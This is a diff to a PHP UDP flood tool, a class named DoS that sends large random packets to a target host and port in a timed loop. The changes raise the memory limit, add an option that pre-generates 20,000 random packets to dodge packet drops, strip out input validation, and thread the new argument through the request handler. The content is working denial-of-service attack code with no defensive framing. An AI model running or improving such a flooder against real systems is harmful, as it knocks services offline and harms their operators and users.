@@ -28,6 +28,8 @@ error_reporting(E_ERROR | E_WARNING);
 
 ini_set('max_execution_time', 0);
 
+ini_set('memory_limit', '2048M');
+
 class DoS
 {
     const MIN_PACKET_SIZE = 61440; // 60 kB
@@ -52,20 +54,24 @@ class DoS
     private $time;
 
     /**
+     * Flood time in seconds
+     * @var boolean
+     */
+    private $random;
+
+    /**
      * DoS constructor.
      * @param $host string Target host
      * @param $port int target port
      * @param $time int flood time in Seconds
+     * @param $random boolean randomize all packets to avoid packet drops
      */
-    public function __construct($host, $port, $time)
+    public function __construct($host, $port, $time, $random)
     {
-        Preconditions::checkArgument(filter_var($host, FILTER_VALIDATE_IP), "host missing or incorrect format");
-        Preconditions::checkArgument(filter_var($port, FILTER_VALIDATE_INT), "port incorrect format");
-        Preconditions::checkArgument(filter_var($time, FILTER_VALIDATE_INT), "time missing or incorrect format");
-
         $this->host = $host;
         $this->port = $port;
         $this->time = $time;
+        $this->random = $random;
     }
 
     /**
@@ -74,15 +80,15 @@ class DoS
      */
     public function flood()
     {
-        $packets = $this->generatePackets(1337);
-
-        $endTime = time() + $this->time;
+        // pre generate packets to be faster while sending the packets
+        $packets = $this->generatePackets($this->random ? 20000 : 1);
 
         $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
         if (!$socket) {
             throw new Exception($errorMessage);
         }
 
+        $endTime = time() + $this->time;
         while(time() <= $endTime) {
             @fwrite($socket, $packets[array_rand($packets)]);
         }
@@ -90,74 +96,12 @@ class DoS
     }
 
     private function generatePackets($size) {
-        $random = Random::get();
-
         $packets = array();
         for ($i = 0; $i < $size; $i++) {
             $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
-            $packets[] = $random->string($length);
+            $packets[] = bin2hex(openssl_random_pseudo_bytes($length / 2));
         }
         return $packets;
-    }
-}
-
-class Preconditions
-{
-    /**
-     * Ensures the truth of an expression involving one or more parameters to the calling method.
-     * @param $expression boolean a boolean expression
-     * @param $errorMessage string the exception message to use if the check fails
-     * @throws InvalidArgumentException if expression is false
-     */
-    public static function checkArgument($expression, $errorMessage)
-    {
-        if (!$expression) {
-            throw new InvalidArgumentException($errorMessage);
-        }
-    }
-}
-
-interface IRandom
-{
-    /**
-     * Creates a random string whose length is the number of characters specified.
-     * @min $length int lowest value to be returned
-     * @max $length int highest value to be returned
-     * @return string the random string
-     */
-    public function string($length);
-}
-
-class ShuffleRandom implements IRandom
-{
-    public function string($length)
-    {
-        return str_shuffle(substr(str_repeat(md5(mt_rand()), 2 + $length / 32), 0, $length));
-    }
-}
-
-class OpenSSLRandom implements IRandom
-{
-    public function string($length)
-    {
-        return bin2hex(openssl_random_pseudo_bytes($length / 2));
-    }
-}
-
-class Random
-{
-    /**
-     * Creates a random generator depending on the PHP version
-     * @return IRandom the random generator
-     */
-    public static function get()
-    {
-        // openssl_random_pseudo_bytes is the fastest way to generate a random string
-        if (function_exists("openssl_random_pseudo_bytes")) {
-            return new OpenSSLRandom();
-        } else {
-            return new ShuffleRandom();
-        }
     }
 }
 
@@ -171,12 +115,13 @@ class Application
         }
 
         $host = $args['host'];
-        $port = isset($args['port']) ? $args['port'] : 80;
-        $time = isset($args['time']) ? $args['time'] : 60;
+        $port = isset($args['port']) ? intval($args['port']) : 80;
+        $time = isset($args['time']) ? intval($args['time']) : 60;
+        $random = isset($args['random']) ? boolval($args['random']) : false;
 
         $result = null;
         try {
-            $dos = new DoS($host, $port, $time);
+            $dos = new DoS($host, $port, $time, $random);
             $dos->flood();
 
             $result = array("success" => "true");
